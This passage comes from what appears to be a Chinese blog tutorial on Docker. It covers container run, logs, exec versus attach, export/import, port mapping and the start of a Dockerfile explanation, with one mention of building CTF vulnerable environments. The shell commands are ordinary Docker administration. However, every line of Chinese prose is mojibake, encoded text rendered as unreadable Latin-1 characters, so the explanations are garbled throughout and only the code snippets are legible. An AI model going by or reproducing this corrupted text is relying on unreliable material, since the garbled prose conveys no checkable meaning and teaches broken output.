world</span><br></pre></td></tr></table></figure><p>å®¹å™¨ä¼šæŠŠè¾“å‡ºçš„ç»“æœ (STDOUT) æ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢</p><p>å¦‚æœä½¿ç”¨äº† -d å‚æ•°è¿è¡Œå®¹å™¨ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">run</span><span class="bash"> -d ubuntu:18.04 /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br><span class="line"><span class="number">77</span>b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å®¹å™¨ä¼šåœ¨åå°è¿è¡Œå¹¶ä¸ä¼šæŠŠè¾“å‡ºçš„ç»“æœ (STDOUT) æ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢(è¾“å‡ºç»“æœå¯ä»¥ç”¨ docker logs æŸ¥çœ‹)ã€‚</p><p><strong>æ³¨</strong>ï¼š å®¹å™¨æ˜¯å¦ä¼šé•¿ä¹…è¿è¡Œï¼Œæ˜¯å’Œ docker run æŒ‡å®šçš„å‘½ä»¤æœ‰å…³ï¼Œå’Œ -d å‚æ•°æ— å…³ã€‚</p><p>ä½¿ç”¨ <code>-d</code> å‚æ•°å¯åŠ¨åä¼šè¿”å›ä¸€ä¸ªå”¯ä¸€çš„ idï¼Œä¹Ÿå¯ä»¥é€šè¿‡ <code>docker container ls</code> å‘½ä»¤æ¥æŸ¥çœ‹å®¹å™¨ä¿¡æ¯ã€‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker container <span class="keyword">ls</span></span><br><span class="line">CONTAINER ID  IMAGE         COMMAND               CREATED        STATUS       PORTS NAMES</span><br><span class="line">77b2dc01fe0f  ubuntu:18.04  /bin/<span class="keyword">sh</span> -c '<span class="keyword">while</span> tr  2 minutes ago  Up 1 minute        agitated_wright</span><br></pre></td></tr></table></figure><p>è¦è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ <code>docker container logs</code> å‘½ä»¤ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> docker container logs [container ID <span class="keyword">or</span> NAMES]</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><p><strong>ç»ˆæ­¢å®¹å™¨</strong></p><p>å¯ä»¥ä½¿ç”¨ <code>docker container stop</code> æ¥ç»ˆæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ã€‚</p><p>æ­¤å¤–ï¼Œå½“ Docker å®¹å™¨ä¸­æŒ‡å®šçš„åº”ç”¨ç»ˆç»“æ—¶ï¼Œå®¹å™¨ä¹Ÿè‡ªåŠ¨ç»ˆæ­¢ã€‚</p><p>ç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨å¯ä»¥ç”¨ docker container ls -a å‘½ä»¤çœ‹åˆ°ã€‚ä¾‹å¦‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="keyword">ls</span> -a</span><br><span class="line">CONTAINER ID        IMAGE                    COMMAND                CREATED             STATUS                          PORTS               NAMES</span><br><span class="line">ba267838cc1b        ubuntu:18.04             <span class="string">"/bin/bash"</span>            30 minutes ago      Exited (0) <span class="keyword">About</span> a minute ago                       trusting_newton</span><br><span class="line">98e5efa7d997        training/webapp:latest   <span class="string">"python app.py"</span>        <span class="keyword">About</span> <span class="keyword">an</span> hour ago   Exited (0) 34 minutes ago                           backstabbing_pike</span><br></pre></td></tr></table></figure><p>å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œå¯ä»¥é€šè¿‡ <code>docker container start</code> å‘½ä»¤æ¥é‡æ–°å¯åŠ¨ã€‚</p><p>æ­¤å¤–ï¼Œ<code>docker container restart</code> å‘½ä»¤ä¼šå°†ä¸€ä¸ªè¿è¡Œæ€çš„å®¹å™¨ç»ˆæ­¢ï¼Œç„¶åå†é‡æ–°å¯åŠ¨å®ƒã€‚</p><blockquote><p>å¥½åƒä¹Ÿå¯ä»¥ç›´æ¥docker start/stop/restart ID</p></blockquote><p><strong>æ–‡ä»¶åŒå‘ä¼ è¾“</strong></p><p>å¦‚æœæ˜¯å®¹å™¨ä¼ è¾“æ–‡ä»¶åˆ°æœ¬åœ°çš„è¯ï¼Œåè¿‡æ¥å°±å¥½äº†ï¼š<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">cp</span> IDå…¨ç§°:å®¹å™¨æ–‡ä»¶è·¯å¾„ æœ¬åœ°è·¯å¾„</span><br></pre></td></tr></table></figure></p><p><strong>å¥½ç”¨çš„å‘½ä»¤</strong></p><p>åœæ­¢å¹¶åˆ é™¤æ‰€æœ‰çš„å®¹å™¨</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">stop</span> $(docker <span class="keyword">ps</span> -q) &amp; docker rm $(docker <span class="keyword">ps</span> -aq)</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ‰€æœ‰çš„é•œåƒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥å®¹å™¨</strong></p><p>åœ¨ä½¿ç”¨ <code>-d</code> å‚æ•°æ—¶ï¼Œå®¹å™¨å¯åŠ¨åä¼šè¿›å…¥åå°ã€‚</p><p>æŸäº›æ—¶å€™éœ€è¦è¿›å…¥å®¹å™¨è¿›è¡Œæ“ä½œï¼ŒåŒ…æ‹¬ä½¿ç”¨ <code>docker attach</code> å‘½ä»¤æˆ– <code>docker exec</code> å‘½ä»¤ï¼Œæ¨èå¤§å®¶ä½¿ç”¨ <code>docker exec</code> å‘½ä»¤ï¼ŒåŸå› ä¼šåœ¨ä¸‹é¢è¯´æ˜ã€‚</p><p><code>attach å‘½ä»¤</code></p><p>ä¸‹é¢ç¤ºä¾‹å¦‚ä½•ä½¿ç”¨ docker attach å‘½ä»¤ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -dit ubuntu</span><br><span class="line"><span class="number">243</span><span class="keyword">c</span><span class="number">32535</span>da<span class="number">7</span>d<span class="number">142</span>fb<span class="number">0e6</span>df<span class="number">616</span>a<span class="number">3</span><span class="keyword">c</span><span class="number">3</span>ada<span class="number">0</span>b<span class="number">8</span>ab<span class="number">417937</span><span class="keyword">c</span><span class="number">853</span>a<span class="number">9e1</span><span class="keyword">c</span><span class="number">251</span>f<span class="number">499</span>f<span class="number">550</span></span><br><span class="line"></span><br><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="number">243</span><span class="keyword">c</span><span class="number">32535</span>da<span class="number">7</span>        ubuntu:latest       <span class="string">"/bin/bash"</span>         <span class="number">18</span> seconds ago      Up <span class="number">17</span> seconds                           nostalgic_hypatia</span><br><span class="line"></span><br><span class="line">$ docker attach <span class="number">243</span><span class="keyword">c</span></span><br><span class="line">root<span class="title">@243</span><span class="keyword">c</span><span class="number">32535</span>da<span class="number">7</span>:/#</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š å¦‚æœä»è¿™ä¸ª stdin ä¸­ exitï¼Œä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚</p></blockquote><p><code>exec å‘½ä»¤</code></p><p>docker exec åè¾¹å¯ä»¥è·Ÿå¤šä¸ªå‚æ•°ï¼Œè¿™é‡Œä¸»è¦è¯´æ˜ -i -t å‚æ•°ã€‚</p><p>åªç”¨ -i å‚æ•°æ—¶ï¼Œç”±äºæ²¡æœ‰åˆ†é…ä¼ªç»ˆç«¯ï¼Œç•Œé¢æ²¡æœ‰æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ï¼Œä½†å‘½ä»¤æ‰§è¡Œç»“æœä»ç„¶å¯ä»¥è¿”å›ã€‚</p><p>å½“ <code>-i -t</code> å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œåˆ™å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -dit ubuntu</span></span><br><span class="line">69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container ls</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">69d137adef7a        ubuntu:latest       "/bin/bash"         18 seconds ago      Up 17 seconds                           zealous_swirles</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -i 69d1 bash</span></span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it 69d1 bash</span></span><br><span class="line">root@69d137adef7a:/#</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä»è¿™ä¸ª stdin ä¸­ exitï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ¨èå¤§å®¶ä½¿ç”¨ docker exec çš„åŸå› ã€‚</p></blockquote><p><em>æ›´å¤šå‚æ•°è¯´æ˜è¯·ä½¿ç”¨ docker exec â€“help æŸ¥çœ‹ã€‚</em></p><p><strong>å¯¼å‡ºå’Œå¯¼å…¥å®¹å™¨</strong></p><p>å¦‚æœè¦å¯¼å‡ºæœ¬åœ°æŸä¸ªå®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ <code>docker export</code> å‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container ls -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES</span><br><span class="line">7691a814370e        ubuntu:18.04        "/bin/bash"         36 hours ago        Exited (0) 21 hours ago                       test</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">export</span> 7691a814370e &gt; ubuntu.tar</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°†å¯¼å‡ºå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°æ–‡ä»¶ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>docker import</code> ä»å®¹å™¨å¿«ç…§æ–‡ä»¶ä¸­å†å¯¼å…¥ä¸ºé•œåƒï¼Œä¾‹å¦‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">cat</span> ubuntu.tar | docker import - <span class="keyword">test</span>/ubuntu:v1.0</span><br><span class="line">$ docker image <span class="keyword">ls</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE</span><br><span class="line"><span class="keyword">test</span>/ubuntu         v1.0                9d37a6082e97        <span class="keyword">About</span> a minute ago   171.3 MB</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®š URL æˆ–è€…æŸä¸ªç›®å½•æ¥å¯¼å…¥ï¼Œä¾‹å¦‚</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">import</span> <span class="string">http:</span><span class="comment">//example.com/exampleimage.tgz example/imagerepo</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šç”¨æˆ·æ—¢å¯ä»¥ä½¿ç”¨ docker load æ¥å¯¼å…¥é•œåƒå­˜å‚¨æ–‡ä»¶åˆ°æœ¬åœ°é•œåƒåº“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ docker import æ¥å¯¼å…¥ä¸€ä¸ªå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°é•œåƒåº“ã€‚è¿™ä¸¤è€…çš„åŒºåˆ«åœ¨äºå®¹å™¨å¿«ç…§æ–‡ä»¶å°†ä¸¢å¼ƒæ‰€æœ‰çš„å†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯ï¼ˆå³ä»…ä¿å­˜å®¹å™¨å½“æ—¶çš„å¿«ç…§çŠ¶æ€ï¼‰ï¼Œè€Œé•œåƒå­˜å‚¨æ–‡ä»¶å°†ä¿å­˜å®Œæ•´è®°å½•ï¼Œä½“ç§¯ä¹Ÿè¦å¤§ã€‚æ­¤å¤–ï¼Œä»å®¹å™¨å¿«ç…§æ–‡ä»¶å¯¼å…¥æ—¶å¯ä»¥é‡æ–°æŒ‡å®šæ ‡ç­¾ç­‰å…ƒæ•°æ®ä¿¡æ¯ã€‚</p></blockquote><p><strong>åˆ é™¤å®¹å™¨</strong></p><p>å¯ä»¥ä½¿ç”¨ docker container rm æ¥åˆ é™¤ä¸€ä¸ªå¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¾‹å¦‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container rm  trusting_newton</span></span><br><span class="line">trusting_newton</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼Œå¯ä»¥æ·»åŠ  -f å‚æ•°ã€‚Docker ä¼šå‘é€ SIGKILL ä¿¡å·ç»™å®¹å™¨ã€‚</p><p>æ¸…ç†æ‰€æœ‰å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨</p><p>ç”¨ <code>docker container ls -a</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å·²ç»åˆ›å»ºçš„åŒ…æ‹¬ç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œå¦‚æœæ•°é‡å¤ªå¤šè¦ä¸€ä¸ªä¸ªåˆ é™¤å¯èƒ½ä¼šå¾ˆéº»çƒ¦ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥æ¸…ç†æ‰æ‰€æœ‰å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container prune</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨ç½‘ç»œ"><a href="#ä½¿ç”¨ç½‘ç»œ" class="headerlink" title="ä½¿ç”¨ç½‘ç»œ"></a>ä½¿ç”¨ç½‘ç»œ</h3><p><strong>å¤–éƒ¨è®¿é—®å®¹å™¨</strong></p><p>å®¹å™¨ä¸­å¯ä»¥è¿è¡Œä¸€äº›ç½‘ç»œåº”ç”¨ï¼Œè¦è®©å¤–éƒ¨ä¹Ÿå¯ä»¥è®¿é—®è¿™äº›åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡ <code>-P</code> æˆ– <code>-p</code> å‚æ•°æ¥æŒ‡å®šç«¯å£æ˜ å°„ã€‚</p><p>å½“ä½¿ç”¨ -P æ ‡è®°æ—¶ï¼ŒDocker ä¼šéšæœºæ˜ å°„ä¸€ä¸ª 49000~49900 çš„ç«¯å£åˆ°å†…éƒ¨å®¹å™¨å¼€æ”¾çš„ç½‘ç»œç«¯å£ã€‚</p><p>ä½¿ç”¨ docker container ls å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ä¸»æœºçš„ 49155 è¢«æ˜ å°„åˆ°äº†å®¹å™¨çš„ 5000 ç«¯å£ã€‚æ­¤æ—¶è®¿é—®æœ¬æœºçš„ 49155 ç«¯å£å³å¯è®¿é—®å®¹å™¨å†… web åº”ç”¨æä¾›çš„ç•Œé¢ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P training/webapp python app.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container ls -l</span></span><br><span class="line">CONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES</span><br><span class="line">bc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155-&gt;5000/tcp  nostalgic_morse</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œå¯ä»¥é€šè¿‡ <code>docker logs</code> å‘½ä»¤æ¥æŸ¥çœ‹åº”ç”¨çš„ä¿¡æ¯ã€‚</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs -f nostalgic_morse</span><br><span class="line">* Running on http://<span class="number">0.0.0.0:5000</span>/</span><br><span class="line"><span class="number">10.0.2.2</span> - - <span class="string">[23/May/2014 20:16:31]</span> <span class="string">"<span class="keyword">GET</span> / HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">10.0.2.2</span> - - <span class="string">[23/May/2014 20:16:31]</span> <span class="string">"<span class="keyword">GET</span> /favicon.ico HTTP/1.1"</span> <span class="number">404</span> -</span><br></pre></td></tr></table></figure><p><code>-p</code> åˆ™å¯ä»¥æŒ‡å®šè¦æ˜ å°„çš„ç«¯å£ï¼Œå¹¶ä¸”ï¼Œåœ¨ä¸€ä¸ªæŒ‡å®šç«¯å£ä¸Šåªå¯ä»¥ç»‘å®šä¸€ä¸ªå®¹å™¨ã€‚æ”¯æŒçš„æ ¼å¼æœ‰ <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code>ã€‚</p><p><strong>æ˜ å°„æ‰€æœ‰æ¥å£åœ°å€</strong></p><p>ä½¿ç”¨ hostPort:containerPort æ ¼å¼æœ¬åœ°çš„ 5000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œå¯ä»¥æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 5000:5000 training/webapp python app.py</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é»˜è®¤ä¼šç»‘å®šæœ¬åœ°æ‰€æœ‰æ¥å£ä¸Šçš„æ‰€æœ‰åœ°å€ã€‚</p><p><strong>æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„æŒ‡å®šç«¯å£</strong></p><p>å¯ä»¥ä½¿ç”¨ <code>ip:hostPort:containerPort</code> æ ¼å¼æŒ‡å®šæ˜ å°„ä½¿ç”¨ä¸€ä¸ªç‰¹å®šåœ°å€ï¼Œæ¯”å¦‚ localhost åœ°å€ 127.0.0.1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py</span></span><br></pre></td></tr></table></figure><p><strong>æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„ä»»æ„ç«¯å£</strong></p><p>ä½¿ç”¨ <code>ip::containerPort</code> ç»‘å®š localhost çš„ä»»æ„ç«¯å£åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œæœ¬åœ°ä¸»æœºä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£ã€‚</p><p>$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py</p><p>è¿˜å¯ä»¥ä½¿ç”¨ <code>udp</code> æ ‡è®°æ¥æŒ‡å®š <code>udp</code> ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ˜ å°„ç«¯å£é…ç½®</strong></p><p>ä½¿ç”¨ <code>docker port</code> æ¥æŸ¥çœ‹å½“å‰æ˜ å°„çš„ç«¯å£é…ç½®ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åˆ°ç»‘å®šçš„åœ°å€</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker port nostalgic_morse <span class="number">5000</span></span><br><span class="line"><span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">49155</span>.</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š<br>å®¹å™¨æœ‰è‡ªå·±çš„å†…éƒ¨ç½‘ç»œå’Œ ip åœ°å€ï¼ˆä½¿ç”¨ docker inspect å¯ä»¥è·å–æ‰€æœ‰çš„å˜é‡ï¼ŒDocker è¿˜å¯ä»¥æœ‰ä¸€ä¸ªå¯å˜çš„ç½‘ç»œé…ç½®ã€‚ï¼‰<br>-p æ ‡è®°å¯ä»¥å¤šæ¬¡ä½¿ç”¨æ¥ç»‘å®šå¤šä¸ªç«¯å£</p></blockquote><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d \</span><br><span class="line">    -<span class="ruby">p <span class="number">5000</span><span class="symbol">:</span><span class="number">5000</span> \</span></span><br><span class="line"><span class="ruby">    -p <span class="number">3000</span><span class="symbol">:</span><span class="number">80</span> \</span></span><br><span class="line"><span class="ruby">    training/webapp \</span></span><br><span class="line"><span class="ruby">    python app.py</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æŸ¥çœ‹å®¹å™¨çš„å…·ä½“IPåœ°å€ï¼Œå¦‚æœè¾“å‡ºæ˜¯ç©ºçš„è¯´æ˜æ²¡æœ‰é…ç½®IPåœ°å€<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker </span><span class="string">inspect </span><span class="built_in">--format</span> <span class="string">'&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;'</span> å®¹å™¨<span class="string">id</span></span><br></pre></td></tr></table></figure></p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><h3 id="Dockerfileæ¦‚å¿µ"><a href="#Dockerfileæ¦‚å¿µ" class="headerlink" title="Dockerfileæ¦‚å¿µ"></a>Dockerfileæ¦‚å¿µ</h3><p>å‰é¢æˆ‘ä»¬å·²ç»æåˆ°äº† Docker çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ä»¥ <code>CTF é€‰æ‰‹</code>çš„è§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥å»ä½¿ç”¨ Dockerfile å®šä¹‰é•œåƒï¼Œä¾èµ–é•œåƒæ¥è¿è¡Œå®¹å™¨ï¼Œå¯ä»¥å»æ¨¡æ‹Ÿå‡ºä¸€ä¸ªçœŸå®çš„æ¼æ´åœºæ™¯ã€‚å› æ­¤æ¯«æ— ç–‘é—®çš„è¯´ï¼Œ Dockerfile æ˜¯é•œåƒå’Œå®¹å™¨çš„å…³é”®ï¼Œå¹¶ä¸” Dockerfile è¿˜å¯ä»¥å¾ˆè½»æ˜“çš„å»å®šä¹‰é•œåƒå†…å®¹ï¼Œè¯´äº†è¿™ä¹ˆå¤šï¼Œé‚£ä¹ˆ Dockerfile åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ</p><p>Dockerfile æ˜¯è‡ªåŠ¨æ„å»º docker é•œåƒçš„é…ç½®æ–‡ä»¶ï¼Œ ç”¨æˆ·å¯ä»¥ä½¿ç”¨ Dockerfile å¿«é€Ÿåˆ›å»ºè‡ªå®šä¹‰çš„é•œåƒã€‚Dockerfile ä¸­çš„å‘½ä»¤éå¸¸ç±»ä¼¼äº linux ä¸‹çš„ shell å‘½ä»¤ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™å¹…å›¾æ¥ç›´è§‚åœ°æ„Ÿå—ä¸‹ Docker é•œåƒã€å®¹å™¨å’Œ Dockerfile ä¸‰è€…ä¹‹é—´çš„å…³ç³»ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566372613804.png" alt></p><p>æˆ‘ä»¬ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ Dockerfile å¯ä»¥è‡ªå®šä¹‰é•œåƒï¼Œé€šè¿‡ Docker å‘½ä»¤å»è¿è¡Œé•œåƒï¼Œä»è€Œè¾¾åˆ°å¯åŠ¨å®¹å™¨çš„ç›®çš„ã€‚</p><p>Dockerfile æ˜¯ç”±ä¸€è¡Œè¡Œå‘½ä»¤è¯­å¥ç»„æˆï¼Œå¹¶ä¸”æ”¯æŒå·² <code>#</code> å¼€å¤´çš„æ³¨é‡Šè¡Œã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°† Dockerfile åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>åŸºç¡€é•œåƒ(çˆ¶é•œåƒ)ä¿¡æ¯æŒ‡ä»¤ FROM</li><li>ç»´æŠ¤è€…ä¿¡æ¯æŒ‡ä»¤ MAINTAINER</li><li>é•œåƒæ“ä½œæŒ‡ä»¤ RUN ã€ EVN ã€ ADD å’Œ WORKDIR ç­‰</li><li>å®¹å™¨å¯åŠ¨æŒ‡ä»¤ CMD ã€ ENTRYPOINT å’Œ USER ç­‰</li></ul><h3 id="Dockerfileæ–‡ä»¶æ ¼å¼"><a href="#Dockerfileæ–‡ä»¶æ ¼å¼" class="headerlink" title="Dockerfileæ–‡ä»¶æ ¼å¼"></a>Dockerfileæ–‡ä»¶æ ¼å¼</h3><p>ä¸‹é¢æ˜¯ä¸€æ®µç®€å•çš„Dockerfileçš„ä¾‹å­ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> QYMUA &lt;qymuao3o@gmail.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install -r requirements.txt</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"python"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure><ol><li>ä» Docker Hub ä¸Š pull ä¸‹ python 2.7 çš„åŸºç¡€é•œåƒ</li><li>æ˜¾ç¤ºç»´æŠ¤è€…çš„ä¿¡æ¯</li><li><code>copy</code> å½“å‰ç›®å½•åˆ°å®¹å™¨ä¸­çš„ <code>/app</code> ç›®å½•ä¸‹ å¤åˆ¶æœ¬åœ°ä¸»æœºçš„ <code>&lt;src&gt;</code> ( <code>Dockerfile</code> 